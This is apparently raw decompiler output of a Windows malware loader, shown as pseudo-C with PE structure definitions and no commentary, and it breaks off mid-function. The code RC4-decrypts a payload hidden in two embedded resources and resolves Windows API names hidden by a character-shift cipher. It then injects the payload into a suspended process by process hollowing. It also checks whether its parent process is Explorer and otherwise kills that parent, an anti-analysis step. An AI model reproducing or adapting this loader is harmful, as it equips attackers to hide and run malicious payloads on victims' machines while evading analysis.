typedef unsigned char   undefined;

typedef unsigned long long    GUID;
typedef pointer32 ImageBaseOffset32;

typedef unsigned char    byte;
typedef unsigned int    dword;
typedef unsigned char    uchar;
typedef unsigned int    uint;
typedef unsigned long    ulong;
typedef unsigned char    undefined1;
typedef unsigned short    undefined2;
typedef unsigned int    undefined4;
typedef unsigned short    ushort;
typedef unsigned short    wchar16;
typedef unsigned short    word;
typedef struct CLIENT_ID CLIENT_ID, *PCLIENT_ID;

struct CLIENT_ID {
    void *UniqueProcess;
    void *UniqueThread;
};

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion;

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct {
    dword OffsetToDirectory;
    dword DataIsDirectory;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion {
    dword OffsetToData;
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;
};

typedef ushort WORD;

typedef struct HINSTANCE__ HINSTANCE__, *PHINSTANCE__;

typedef struct HINSTANCE__ *HINSTANCE;

struct HINSTANCE__ {
    int unused;
};

typedef struct HRSRC__ HRSRC__, *PHRSRC__;

typedef struct HRSRC__ *HRSRC;

struct HRSRC__ {
    int unused;
};

typedef void *LPVOID;

typedef ulong DWORD;

typedef uchar BYTE;

typedef HINSTANCE HMODULE;

typedef int BOOL;

typedef void *HANDLE;

typedef HANDLE HGLOBAL;

typedef BYTE *LPBYTE;

typedef uint UINT;

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY IMAGE_RESOURCE_DIRECTORY_ENTRY, *PIMAGE_RESOURCE_DIRECTORY_ENTRY;

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion;

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct {
    dword NameOffset;
    dword NameIsString;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion {
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;
    dword Name;
    word Id;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY {
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion NameUnion;
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion DirectoryUnion;
};

typedef struct IMAGE_OPTIONAL_HEADER32 IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;

typedef struct IMAGE_DATA_DIRECTORY IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

struct IMAGE_DATA_DIRECTORY {
    ImageBaseOffset32 VirtualAddress;
    dword Size;
};

struct IMAGE_OPTIONAL_HEADER32 {
    word Magic;
    byte MajorLinkerVersion;
    byte MinorLinkerVersion;
    dword SizeOfCode;
    dword SizeOfInitializedData;
    dword SizeOfUninitializedData;
    ImageBaseOffset32 AddressOfEntryPoint;
    ImageBaseOffset32 BaseOfCode;
    ImageBaseOffset32 BaseOfData;
    pointer32 ImageBase;
    dword SectionAlignment;
    dword FileAlignment;
    word MajorOperatingSystemVersion;
    word MinorOperatingSystemVersion;
    word MajorImageVersion;
    word MinorImageVersion;
    word MajorSubsystemVersion;
    word MinorSubsystemVersion;
    dword Win32VersionValue;
    dword SizeOfImage;
    dword SizeOfHeaders;
    dword CheckSum;
    word Subsystem;
    word DllCharacteristics;
    dword SizeOfStackReserve;
    dword SizeOfStackCommit;
    dword SizeOfHeapReserve;
    dword SizeOfHeapCommit;
    dword LoaderFlags;
    dword NumberOfRvaAndSizes;
    struct IMAGE_DATA_DIRECTORY DataDirectory[16];
};

typedef struct IMAGE_SECTION_HEADER IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;

typedef union Misc Misc, *PMisc;

typedef enum SectionFlags {
    IMAGE_SCN_TYPE_NO_PAD=8,
    IMAGE_SCN_RESERVED_0001=16,
    IMAGE_SCN_CNT_CODE=32,
    IMAGE_SCN_CNT_INITIALIZED_DATA=64,
    IMAGE_SCN_CNT_UNINITIALIZED_DATA=128,
    IMAGE_SCN_LNK_OTHER=256,
    IMAGE_SCN_LNK_INFO=512,
    IMAGE_SCN_RESERVED_0040=1024,
    IMAGE_SCN_LNK_REMOVE=2048,
    IMAGE_SCN_LNK_COMDAT=4096,
    IMAGE_SCN_GPREL=32768,
    IMAGE_SCN_MEM_16BIT=131072,
    IMAGE_SCN_MEM_PURGEABLE=131072,
    IMAGE_SCN_MEM_LOCKED=262144,
    IMAGE_SCN_MEM_PRELOAD=524288,
    IMAGE_SCN_ALIGN_1BYTES=1048576,
    IMAGE_SCN_ALIGN_2BYTES=2097152,
    IMAGE_SCN_ALIGN_4BYTES=3145728,
    IMAGE_SCN_ALIGN_8BYTES=4194304,
    IMAGE_SCN_ALIGN_16BYTES=5242880,
    IMAGE_SCN_ALIGN_32BYTES=6291456,
    IMAGE_SCN_ALIGN_64BYTES=7340032,
    IMAGE_SCN_ALIGN_128BYTES=8388608,
    IMAGE_SCN_ALIGN_256BYTES=9437184,
    IMAGE_SCN_ALIGN_512BYTES=10485760,
    IMAGE_SCN_ALIGN_1024BYTES=11534336,
    IMAGE_SCN_ALIGN_2048BYTES=12582912,
    IMAGE_SCN_ALIGN_4096BYTES=13631488,
    IMAGE_SCN_ALIGN_8192BYTES=14680064,
    IMAGE_SCN_LNK_NRELOC_OVFL=16777216,
    IMAGE_SCN_MEM_DISCARDABLE=33554432,
    IMAGE_SCN_MEM_NOT_CACHED=67108864,
    IMAGE_SCN_MEM_NOT_PAGED=134217728,
    IMAGE_SCN_MEM_SHARED=268435456,
    IMAGE_SCN_MEM_EXECUTE=536870912,
    IMAGE_SCN_MEM_READ=1073741824,
    IMAGE_SCN_MEM_WRITE=2147483648
} SectionFlags;

union Misc {
    dword PhysicalAddress;
    dword VirtualSize;
};

struct IMAGE_SECTION_HEADER {
    char Name[8];
    union Misc Misc;
    ImageBaseOffset32 VirtualAddress;
    dword SizeOfRawData;
    dword PointerToRawData;
    dword PointerToRelocations;
    dword PointerToLinenumbers;
    word NumberOfRelocations;
    word NumberOfLinenumbers;
    enum SectionFlags Characteristics;
};

typedef struct IMAGE_RESOURCE_DATA_ENTRY IMAGE_RESOURCE_DATA_ENTRY, *PIMAGE_RESOURCE_DATA_ENTRY;

struct IMAGE_RESOURCE_DATA_ENTRY {
    dword OffsetToData;
    dword Size;
    dword CodePage;
    dword Reserved;
};

typedef struct IMAGE_RESOURCE_DIRECTORY IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY;

struct IMAGE_RESOURCE_DIRECTORY {
    dword Characteristics;
    dword TimeDateStamp;
    word MajorVersion;
    word MinorVersion;
    word NumberOfNamedEntries;
    word NumberOfIdEntries;
};

typedef struct IMAGE_FILE_HEADER IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

struct IMAGE_FILE_HEADER {
    word Machine; // 332
    word NumberOfSections;
    dword TimeDateStamp;
    dword PointerToSymbolTable;
    dword NumberOfSymbols;
    word SizeOfOptionalHeader;
    word Characteristics;
};

typedef struct IMAGE_NT_HEADERS32 IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;

struct IMAGE_NT_HEADERS32 {
    char Signature[4];
    struct IMAGE_FILE_HEADER FileHeader;
    struct IMAGE_OPTIONAL_HEADER32 OptionalHeader;
};

typedef struct _STARTUPINFOA _STARTUPINFOA, *P_STARTUPINFOA;

typedef char CHAR;

typedef CHAR *LPSTR;

struct _STARTUPINFOA {
    DWORD cb;
    LPSTR lpReserved;
    LPSTR lpDesktop;
    LPSTR lpTitle;
    DWORD dwX;
    DWORD dwY;
    DWORD dwXSize;
    DWORD dwYSize;
    DWORD dwXCountChars;
    DWORD dwYCountChars;
    DWORD dwFillAttribute;
    DWORD dwFlags;
    WORD wShowWindow;
    WORD cbReserved2;
    LPBYTE lpReserved2;
    HANDLE hStdInput;
    HANDLE hStdOutput;
    HANDLE hStdError;
};

typedef struct _STARTUPINFOA *LPSTARTUPINFOA;

typedef struct _CONTEXT _CONTEXT, *P_CONTEXT;

typedef struct _CONTEXT CONTEXT;

typedef struct _FLOATING_SAVE_AREA _FLOATING_SAVE_AREA, *P_FLOATING_SAVE_AREA;

typedef struct _FLOATING_SAVE_AREA FLOATING_SAVE_AREA;

struct _FLOATING_SAVE_AREA {
    DWORD ControlWord;
    DWORD StatusWord;
    DWORD TagWord;
    DWORD ErrorOffset;
    DWORD ErrorSelector;
    DWORD DataOffset;
    DWORD DataSelector;
    BYTE RegisterArea[80];
    DWORD Cr0NpxState;
};

struct _CONTEXT {
    DWORD ContextFlags;
    DWORD Dr0;
    DWORD Dr1;
    DWORD Dr2;
    DWORD Dr3;
    DWORD Dr6;
    DWORD Dr7;
    FLOATING_SAVE_AREA FloatSave;
    DWORD SegGs;
    DWORD SegFs;
    DWORD SegEs;
    DWORD SegDs;
    DWORD Edi;
    DWORD Esi;
    DWORD Ebx;
    DWORD Edx;
    DWORD Ecx;
    DWORD Eax;
    DWORD Ebp;
    DWORD Eip;
    DWORD SegCs;
    DWORD EFlags;
    DWORD Esp;
    DWORD SegSs;
    BYTE ExtendedRegisters[512];
};

typedef struct _EXCEPTION_RECORD _EXCEPTION_RECORD, *P_EXCEPTION_RECORD;

typedef struct _EXCEPTION_RECORD EXCEPTION_RECORD;

typedef EXCEPTION_RECORD *PEXCEPTION_RECORD;

typedef void *PVOID;

typedef ulong ULONG_PTR;

struct _EXCEPTION_RECORD {
    DWORD ExceptionCode;
    DWORD ExceptionFlags;
    struct _EXCEPTION_RECORD *ExceptionRecord;
    PVOID ExceptionAddress;
    DWORD NumberParameters;
    ULONG_PTR ExceptionInformation[15];
};

typedef CHAR *LPCSTR;

typedef CONTEXT *PCONTEXT;

typedef struct IMAGE_DOS_HEADER IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

struct IMAGE_DOS_HEADER {
    char e_magic[2]; // Magic number
    word e_cblp; // Bytes of last page
    word e_cp; // Pages in file
    word e_crlc; // Relocations
    word e_cparhdr; // Size of header in paragraphs
    word e_minalloc; // Minimum extra paragraphs needed
    word e_maxalloc; // Maximum extra paragraphs needed
    word e_ss; // Initial (relative) SS value
    word e_sp; // Initial SP value
    word e_csum; // Checksum
    word e_ip; // Initial IP value
    word e_cs; // Initial (relative) CS value
    word e_lfarlc; // File address of relocation table
    word e_ovno; // Overlay number
    word e_res[4][4]; // Reserved words
    word e_oemid; // OEM identifier (for e_oeminfo)
    word e_oeminfo; // OEM information; e_oemid specific
    word e_res2[10][10]; // Reserved words
    dword e_lfanew; // File address of new exe header
    byte e_program[64]; // Actual DOS program
};

typedef struct _EXCEPTION_POINTERS _EXCEPTION_POINTERS, *P_EXCEPTION_POINTERS;

struct _EXCEPTION_POINTERS {
    PEXCEPTION_RECORD ExceptionRecord;
    PCONTEXT ContextRecord;
};

typedef uint UINT_PTR;

typedef struct _startupinfo _startupinfo, *P_startupinfo;

struct _startupinfo {
    int newmode;
};

typedef uint size_t;




int FUN_00401000(short *param_1,byte *param_2)

{
  byte bVar1;
  int iVar2;
  BOOL BVar3;
  int iVar4;
  byte *pbVar5;
  short *psVar6;
  int *piVar7;
  void *lp;
  byte *pbVar8;
  bool bVar9;
  
  BVar3 = IsBadReadPtr(param_1,0x40);
  if ((BVar3 == 0) && (*param_1 == 0x5a4d)) {
    piVar7 = (int *)(*(int *)(param_1 + 0x1e) + (int)param_1);
    BVar3 = IsBadReadPtr(piVar7,0xf8);
    if ((BVar3 == 0) && (*piVar7 == 0x4550)) {
      lp = (void *)(piVar7[0x1e] + (int)param_1);
      BVar3 = IsBadReadPtr(lp,0x28);
      if (BVar3 == 0) {
        iVar2 = *(int *)((int)lp + 0x1c);
        psVar6 = (short *)(*(int *)((int)lp + 0x24) + (int)param_1);
        if (((uint)param_2 & 0xffff0000) == 0) {
          BVar3 = IsBadReadPtr((void *)((int)param_1 + (short)param_2 * 4 + iVar2),4);
          if (BVar3 == 0) {
            return *(int *)((int)param_1 + (int)param_2 * 4 + iVar2) + (int)param_1;
          }
        }
        else {
          piVar7 = (int *)(*(int *)((int)lp + 0x20) + (int)param_1);
          iVar4 = IsBadReadPtr(piVar7,4);
          while (iVar4 == 0) {
            pbVar5 = (byte *)((int)param_1 + *piVar7);
            pbVar8 = param_2;
            do {
              bVar1 = *pbVar5;
              bVar9 = bVar1 < *pbVar8;
              if (bVar1 != *pbVar8) {
LAB_004010b7:
                iVar4 = (1 - (uint)bVar9) - (uint)(bVar9 != 0);
                goto LAB_004010bc;
              }
              if (bVar1 == 0) break;
              bVar1 = pbVar5[1];
              bVar9 = bVar1 < pbVar8[1];
              if (bVar1 != pbVar8[1]) goto LAB_004010b7;
              pbVar5 = pbVar5 + 2;
              pbVar8 = pbVar8 + 2;
            } while (bVar1 != 0);
            iVar4 = 0;
LAB_004010bc:
            if ((iVar4 == 0) &&
               (BVar3 = IsBadReadPtr((void *)((int)param_1 + *psVar6 * 4 + iVar2),4), BVar3 == 0)) {
              return *(int *)((int)param_1 + *psVar6 * 4 + iVar2) + (int)param_1;
            }
            piVar7 = piVar7 + 1;
            psVar6 = psVar6 + 1;
            iVar4 = IsBadReadPtr(piVar7,4);
          }
        }
      }
    }
  }
  return 0;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_00401130(undefined4 param_1,short *param_2)

{
  byte *pbVar1;
  HMODULE pHVar2;
  code *pcVar3;
  code *pcVar4;
  int iVar5;
  code *unaff_EBP;
  int iVar6;
  int iVar7;
  undefined4 *puVar8;
  short *psVar9;
  int iVar10;
  code *pcVar11;
  code *pcVar12;
  undefined4 uVar13;
  undefined4 uVar14;
  int local_32c;
  undefined local_328 [4];
  undefined auStack_324 [12];
  int local_318;
  int local_314;
  undefined4 local_310 [17];
  undefined4 local_2cc;
  int iStack_27c;
  
  puVar8 = local_310;
  for (iVar5 = 0x11; iVar5 != 0; iVar5 = iVar5 + -1) {
    *puVar8 = 0;
    puVar8 = puVar8 + 1;
  }
  _DAT_004030dc = param_2;
  local_310[0] = 0x44;
  local_2cc = 0x10007;
  DAT_004030e0 = param_2;
  if ((*param_2 == 0x5a4d) &&
     (DAT_004030d8 = (int *)(*(int *)(param_2 + 0x1e) + (int)param_2), *DAT_004030d8 == 0x4550)) {
    pbVar1 = (byte *)FUN_00401370(&DAT_004030a0);
    pHVar2 = GetModuleHandleA(s_kernel32_dll_00403090);
    pcVar3 = (code *)FUN_00401000((short *)pHVar2,pbVar1);
    pbVar1 = (byte *)FUN_00401370(&DAT_00403078);
    pHVar2 = GetModuleHandleA(s_ntdll_dll_0040306c);
    local_318 = FUN_00401000((short *)pHVar2,pbVar1);
    pbVar1 = (byte *)FUN_00401370(&DAT_0040305c);
    pHVar2 = GetModuleHandleA(s_kernel32_dll_00403090);
    local_32c = FUN_00401000((short *)pHVar2,pbVar1);
    pbVar1 = (byte *)FUN_00401370(&DAT_00403048);
    pHVar2 = GetModuleHandleA(s_kernel32_dll_00403090);
    pcVar4 = (code *)FUN_00401000((short *)pHVar2,pbVar1);
    pbVar1 = (byte *)FUN_00401370(&DAT_00403034);
    pHVar2 = GetModuleHandleA(s_kernel32_dll_00403090);
    local_314 = FUN_00401000((short *)pHVar2,pbVar1);
    pbVar1 = (byte *)FUN_00401370(&DAT_00403020);
    pHVar2 = GetModuleHandleA(s_kernel32_dll_00403090);
    FUN_00401000((short *)pHVar2,pbVar1);
    pbVar1 = (byte *)FUN_00401370(s_RfuxqjZoznko_00403010);
    pHVar2 = GetModuleHandleA(s_kernel32_dll_00403090);
    FUN_00401000((short *)pHVar2,pbVar1);
    uVar14 = 0;
    uVar13 = 4;
    pcVar12 = (code *)0x0;
    pcVar11 = (code *)0x0;
    (*pcVar3)(0,param_1,0,0,0,4,0,0,local_310,local_328);
    (*unaff_EBP)(uVar14,DAT_004030d8[0xd]);
    uVar14 = 0x3000;
    iVar5 = DAT_004030d8[0x14];
    iVar10 = DAT_004030d8[0xd];
    (*pcVar12)(uVar13,iVar10,iVar5,0x3000,0x40);
    uVar13 = 0;
    pcVar3 = (code *)DAT_004030d8[0xd];
    psVar9 = param_2;
    (*pcVar4)(pcVar11,pcVar3,param_2,DAT_004030d8[0x15],0);
    iVar7 = 0;
    if (*(short *)((int)DAT_004030d8 + 6) != 0) {
      iVar6 = 0;
      do {
        _DAT_004030e8 = *(int *)(DAT_004030e0 + 0x1e) + iVar6 + 0xf8 + (int)param_2;
        (*pcVar4)(iVar5,*(int *)(_DAT_004030e8 + 0xc) + DAT_004030d8[0xd],
                  *(int *)(_DAT_004030e8 + 0x14) + (int)param_2,
                  *(undefined4 *)(_DAT_004030e8 + 0x10),0);
        iVar7 = iVar7 + 1;
        iVar6 = iVar6 + 0x28;
      } while (iVar7 < (int)(uint)*(ushort *)((int)DAT_004030d8 + 6));
    }
    (*pcVar11)(uVar14,auStack_324);
    iStack_27c = DAT_004030d8[0xd] + DAT_004030d8[10];
    (*(code *)psVar9)(iVar10,&local_32c);
    (*pcVar3)(uVar13);
  }
  return;
}



char * __cdecl FUN_00401370(char *param_1)

{
  char cVar1;
  int iVar2;
  uint uVar3;
  uint uVar4;
  char *pcVar5;
  
  iVar2 = -1;
  uVar4 = 0;
  pcVar5 = param_1;
  do {
    if (iVar2 == 0) break;
    iVar2 = iVar2 + -1;
    cVar1 = *pcVar5;
    pcVar5 = pcVar5 + 1;
  } while (cVar1 != '\0');
  if (iVar2 != -2) {
    do {
      uVar3 = 0xffffffff;
      param_1[uVar4] = param_1[uVar4] - (char)uVar4;
      uVar4 = uVar4 + 1;
      pcVar5 = param_1;
      do {
        if (uVar3 == 0) break;
        uVar3 = uVar3 - 1;
        cVar1 = *pcVar5;
        pcVar5 = pcVar5 + 1;
      } while (cVar1 != '\0');
    } while (uVar4 < ~uVar3 - 1);
  }
  return param_1;
}



int __cdecl FUN_004013b0(int param_1,int param_2,uint param_3,uint param_4)

{
  uint uVar1;
  uint *puVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  uint local_404;
  uint local_400 [256];
  
  puVar2 = local_400;
  uVar5 = 0;
  uVar1 = 0;
  do {
    *puVar2 = uVar1;
    uVar1 = uVar1 + 1;
    puVar2 = puVar2 + 1;
  } while ((int)uVar1 < 0x100);
  uVar1 = 0;
  puVar2 = local_400;
  do {
    uVar5 = uVar5 + (uint)*(byte *)(uVar1 % param_4 + param_2) + *puVar2 & 0x800000ff;
    if ((int)uVar5 < 0) {
      uVar5 = (uVar5 - 1 | 0xffffff00) + 1;
    }
    local_404 = (uint)*(byte *)puVar2;
    *puVar2 = local_400[uVar5];
    puVar2 = puVar2 + 1;
    uVar1 = uVar1 + 1;
    local_400[uVar5] = local_404;
  } while ((int)uVar1 < 0x100);
  uVar3 = 0;
  if (param_3 == 0) {
    return param_1;
  }
  do {
    uVar1 = uVar1 + 1 & 0x800000ff;
    if ((int)uVar1 < 0) {
      uVar1 = (uVar1 - 1 | 0xffffff00) + 1;
    }
    uVar5 = uVar5 + local_400[uVar1] & 0x800000ff;
    if ((int)uVar5 < 0) {
      uVar5 = (uVar5 - 1 | 0xffffff00) + 1;
    }
    local_404 = (uint)*(byte *)(local_400 + uVar1);
    local_400[uVar1] = local_400[uVar5];
    local_400[uVar5] = local_404;
    uVar4 = local_400[uVar1] + local_404 & 0x800000ff;
    if ((int)uVar4 < 0) {
      uVar4 = (uVar4 - 1 | 0xffffff00) + 1;
    }
    *(byte *)(uVar3 + param_1) = *(byte *)(uVar3 + param_1) ^ *(byte *)(local_400 + uVar4);
    uVar3 = uVar3 + 1;
  } while (uVar3 < param_3);
  return param_1;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 FUN_004014d0(void)

{
  HRSRC pHVar1;
  DWORD DVar2;
  LPVOID pvVar3;
  DWORD DVar4;
  LPVOID pvVar5;
  short *psVar6;
  CHAR local_104 [260];
  
  FUN_004015e0();
  GetModuleFileNameA((HMODULE)0x0,local_104,0x104);
  pHVar1 = FindResourceA((HMODULE)0x0,(LPCSTR)0x96,(LPCSTR)0xa);
  if (pHVar1 != (HRSRC)0x0) {
    DVar2 = SizeofResource((HMODULE)0x0,pHVar1);
    _DAT_004030e4 = LoadResource((HMODULE)0x0,pHVar1);
    if (_DAT_004030e4 != (HGLOBAL)0x0) {
      pvVar3 = LockResource(_DAT_004030e4);
      if (pvVar3 != (LPVOID)0x0) {
        pHVar1 = FindResourceA((HMODULE)0x0,(LPCSTR)0x97,(LPCSTR)0xa);
        if (pHVar1 != (HRSRC)0x0) {
          DVar4 = SizeofResource((HMODULE)0x0,pHVar1);
          _DAT_004030e4 = LoadResource((HMODULE)0x0,pHVar1);
          if (_DAT_004030e4 != (HGLOBAL)0x0) {
            pvVar5 = LockResource(_DAT_004030e4);
            if (pvVar5 != (LPVOID)0x0) {
              psVar6 = (short *)FUN_004013b0((int)pvVar3,(int)pvVar5,DVar2,DVar4);
              FUN_00401130(local_104,psVar6);
            }
          }
        }
      }
    }
  }
  return 0;
}



void __cdecl FUN_004015a0(undefined4 *param_1)

{
  char cVar1;
  char *pcVar2;
  uint uVar3;
  uint uVar4;
  undefined4 *puVar5;
  
  pcVar2 = strrchr((char *)param_1,0x5c);
  if (pcVar2 != (char *)0x0) {
    uVar3 = 0xffffffff;
    puVar5 = (undefined4 *)(pcVar2 + 1);
    do {
      if (uVar3 == 0) break;
      uVar3 = uVar3 - 1;
      cVar1 = *(char *)puVar5;
      puVar5 = (undefined4 *)((int)puVar5 + 1);
    } while (cVar1 != '\0');
    puVar5 = (undefined4 *)(pcVar2 + 1);
    for (uVar4 = ~uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {
      *param_1 = *puVar5;
      puVar5 = puVar5 + 1;
      param_1 = param_1 + 1;
    }
    for (uVar3 = ~uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {
      *(undefined *)param_1 = *(undefined *)puVar5;
      puVar5 = (undefined4 *)((int)puVar5 + 1);
      param_1 = (undefined4 *)((int)param_1 + 1);
    }
  }
  return;
}



void FUN_004015e0(void)

{
  char cVar1;
  byte bVar2;
  undefined4 ******ppppppuVar3;
  undefined4 uVar4;
  undefined4 *puVar5;
  HANDLE pvVar6;
  int iVar7;
  uint uVar8;
  uint uVar9;
  undefined4 ******unaff_ESI;
  byte *pbVar10;
  char *pcVar11;
  undefined4 ******unaff_EDI;
  char *pcVar12;
  char *pcVar13;
  undefined4 *puVar14;
  bool bVar15;
  undefined4 uVar16;
  undefined4 ******appppppuStack_458 [2];
  undefined4 local_450;
  undefined4 ******local_44c [4];
  undefined4 uStack_43c;
  CHAR aCStack_348 [260];
  undefined auStack_244 [8];
  undefined4 ******appppppuStack_23c [2];
  undefined4 uStack_234;
  undefined4 auStack_230 [67];
  undefined4 uStack_124;
  
  ppppppuVar3 = local_44c;
  for (iVar7 = 0x49; iVar7 != 0; iVar7 = iVar7 + -1) {
    *ppppppuVar3 = (undefined4 *****)0x0;
    ppppppuVar3 = ppppppuVar3 + 1;
  }
  local_450 = 0x128;
  ppppppuVar3 = (undefined4 ******)GetCurrentProcessId();
  uVar4 = CreateToolhelp32Snapshot(2,0);
  uVar16 = uVar4;
  iVar7 = Process32First(uVar4);
  if (iVar7 != 0) {
    iVar7 = Process32Next(uVar4,&stack0xfffffba0);
    while (iVar7 != 0) {
      FUN_004015a0(&uStack_43c);
      uVar8 = 0xffffffff;
      puVar5 = &uStack_43c;
      do {
        if (uVar8 == 0) break;
        uVar8 = uVar8 - 1;
        cVar1 = *(char *)puVar5;
        puVar5 = (undefined4 *)((int)puVar5 + 1);
      } while (cVar1 != '\0');
      CharUpperBuffA((LPSTR)&uStack_43c,~uVar8 - 1);
      pbVar10 = &DAT_00403fb3;
      puVar5 = &uStack_43c;
      do {
        bVar2 = *(byte *)puVar5;
        bVar15 = bVar2 < *pbVar10;
        if (bVar2 != *pbVar10) {
LAB_0040168c:
          iVar7 = (1 - (uint)bVar15) - (uint)(bVar15 != 0);
          goto LAB_00401691;
        }
        if (bVar2 == 0) break;
        bVar2 = *(byte *)((int)puVar5 + 1);
        bVar15 = bVar2 < pbVar10[1];
        if (bVar2 != pbVar10[1]) goto LAB_0040168c;
        puVar5 = (undefined4 *)((int)puVar5 + 2);
        pbVar10 = pbVar10 + 2;
      } while (bVar2 != 0);
      iVar7 = 0;
LAB_00401691:
      if (iVar7 == 0) {
        unaff_ESI = appppppuStack_458[0];
      }
      if (appppppuStack_458[0] == ppppppuVar3) {
        unaff_EDI = local_44c[1];
      }
      iVar7 = Process32Next(uVar4,&stack0xfffffba0);
    }
  }
  if (unaff_EDI != unaff_ESI) {
    pvVar6 = OpenProcess(0x1f0fff,1,(DWORD)unaff_EDI);
    TerminateProcess(pvVar6,0);
    return;
  }
  puVar5 = auStack_230;
  for (iVar7 = 0x88; iVar7 != 0; iVar7 = iVar7 + -1) {
    *puVar5 = 0;
    puVar5 = puVar5 + 1;
  }
  uStack_234 = 0x224;
  uVar4 = CreateToolhelp32Snapshot(8,unaff_ESI);
  iVar7 = Module32First(uVar4,appppppuStack_23c);
  do {
    if (iVar7 == 0) {
      return;
    }
    if (unaff_ESI == appppppuStack_23c[0]) {
      GetWindowsDirectoryA(aCStack_348,0x105);
      uVar8 = 0xffffffff;
      pcVar11 = &DAT_004030b0;
      do {
        pcVar12 = pcVar11;
        if (uVar8 == 0) break;
        uVar8 = uVar8 - 1;
        pcVar12 = pcVar11 + 1;
        cVar1 = *pcVar11;
        pcVar11 = pcVar12;
      } while (cVar1 != '\0');
      uVar8 = ~uVar8;
      iVar7 = -1;
      pcVar11 = aCStack_348;
      do {
        pcVar13 = pcVar11;
        if (iVar7 == 0) break;
        iVar7 = iVar7 + -1;
        pcVar13 = pcVar11 + 1;
        cVar1 = *pcVar11;
        pcVar11 = pcVar13;
      } while (cVar1 != '\0');
      puVar5 = (undefined4 *)(pcVar12 + -uVar8);
      puVar14 = (undefined4 *)(pcVar13 + -1);
      for (uVar9 = uVar8 >> 2; uVar9 != 0; uVar9 = uVar9 - 1) {
        *puVar14 = *puVar5;
        puVar5 = puVar5 + 1;
        puVar14 = puVar14 + 1;
      }
      for (uVar8 = uVar8 & 3; uVar8 != 0; uVar8 = uVar8 - 1) {
        *(undefined *)puVar14 = *(undefined *)puVar5;
        puVar5 = (undefined4 *)((int)puVar5 + 1);
        puVar14 = (undefined4 *)((int)puVar14 + 1);
      }
      uVar8 = 0xffffffff;
      pcVar11 = s_EXPLORER_EXE_004030b4;
      do {
        pcVar12 = pcVar11;
        if (uVar8 == 0) break;
        uVar8 = uVar8 - 1;
        pcVar12 = pcVar11 + 1;
        cVar1 = *pcVar11;
        pcVar11 = pcVar12;
      } while (cVar1 != '\0');
      uVar8 = ~uVar8;
      iVar7 = -1;
      pcVar11 = aCStack_348;
      do {
        pcVar13 = pcVar11;
        if (iVar7 == 0) break;
        iVar7 = iVar7 + -1;
        pcVar13 = pcVar11 + 1;
        cVar1 = *pcVar11;
        pcVar11 = pcVar13;
      } while (cVar1 != '\0');
      puVar5 = (undefined4 *)(pcVar12 + -uVar8);
      puVar14 = (undefined4 *)(pcVar13 + -1);
      for (uVar9 = uVar8 >> 2; uVar9 != 0; uVar9 = uVar9 - 1) {
        *puVar14 = *puVar5;
        puVar5 = puVar5 + 1;
        puVar14 = puVar14 + 1;
      }
      for (uVar8 = uVar8 & 3; uVar8 != 0; uVar8 = uVar8 - 1) {
        *(undefined *)puVar14 = *(undefined *)puVar5;
        puVar5 = (undefined4 *)((int)puVar5 + 1);
        puVar14 = (undefined4 *)((int)puVar14 + 1);
      }
      uVar8 = 0xffffffff;
      puVar5 = &uStack_124;
      do {
        if (uVar8 == 0) break;
        uVar8 = uVar8 - 1;
        cVar1 = *(char *)puVar5;
        puVar5 = (undefined4 *)((int)puVar5 + 1);
      } while (cVar1 != '\0');
      CharUpperBuffA((LPSTR)&uStack_124,~uVar8 - 1);
      uVar8 = 0xffffffff;
      pcVar11 = aCStack_348;
      do {
        if (uVar8 == 0) break;
        uVar8 = uVar8 - 1;
        cVar1 = *pcVar11;
        pcVar11 = pcVar11 + 1;
      } while (cVar1 != '\0');
      iVar7 = strncmp((char *)&uStack_124,aCStack_348,~uVar8 - 1);
      if (iVar7 != 0) {
        FUN_004015a0(&uStack_124);
        pcVar11 = s_EXPLORER_EXE_004030b4;
        puVar5 = &uStack_124;
        do {
          bVar2 = *(byte *)puVar5;
          bVar15 = bVar2 < (byte)*pcVar11;
          if (bVar2 != *pcVar11) {
LAB_00401841:
            iVar7 = (1 - (uint)bVar15) - (uint)(bVar15 != 0);
            goto LAB_00401846;
          }
          if (bVar2 == 0) break;
          bVar2 = *(byte *)((int)puVar5 + 1);
          bVar15 = bVar2 < ((byte *)pcVar11)[1];
          if (bVar2 != ((byte *)pcVar11)[1]) goto LAB_00401841;
          puVar5 = (undefined4 *)((int)puVar5 + 2);
